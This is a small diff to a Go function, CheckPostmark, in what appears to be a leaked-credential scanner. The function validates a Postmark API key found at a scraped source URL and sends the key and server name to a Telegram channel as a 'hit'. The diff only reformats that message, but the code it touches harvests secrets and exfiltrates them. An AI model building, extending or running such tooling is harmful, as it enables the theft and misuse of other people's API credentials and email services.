@@ -59,7 +59,7 @@ func (a *AWSScanner) CheckPostmark(key, sourceURL string) bool {
 	globalCounters.mu.Unlock()
 
 	msg := a.tgHit("📧", "POSTMARK", sourceURL) + fmt.Sprintf(
-		"\n🔑 <b>Key:</b> <code>%s</code>\n🖥 <b>Server:</b> %s\n", key, serverName)
+		"Key : %s\nServer : %s\n", key, serverName)
 	go a.sendTelegram(msg)
 	return true
 }
